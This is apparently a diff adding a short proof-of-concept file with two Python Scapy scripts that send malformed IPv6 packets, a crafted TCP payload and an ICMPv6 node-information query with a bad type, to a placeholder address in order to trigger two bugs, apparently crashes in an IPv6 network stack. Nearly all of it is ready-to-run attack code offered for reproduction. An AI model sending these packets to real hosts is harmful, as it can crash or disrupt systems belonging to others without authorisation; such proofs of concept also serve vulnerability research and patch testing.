@@ -1,0 +1,17 @@
+You can reproduce theses two differents bugs easily by using the Python low-level networking lib Scapy
+(http://www.secdev.org/projects/scapy/files/scapy-latest.zip)
+
+1) #only works on x86
+
+#/usr/bin/env python
+from scapy.all import *
+u = "\x92"+"\x02" * 6
+send(IPv6(dst="IPv6_addr_here", nh=6)/u) #nh6 -> TCP
+
+2) # works x86,x64
+
+#/usr/bin/env python
+from scapy.all import *
+
+z = "Q" * 30
+send(IPv6(dst="IPv6_ADDR_HERE",nh=1)/ICMPv6NIQueryNOOP(type=4)/z) #nh1 -> icmp (not v6)
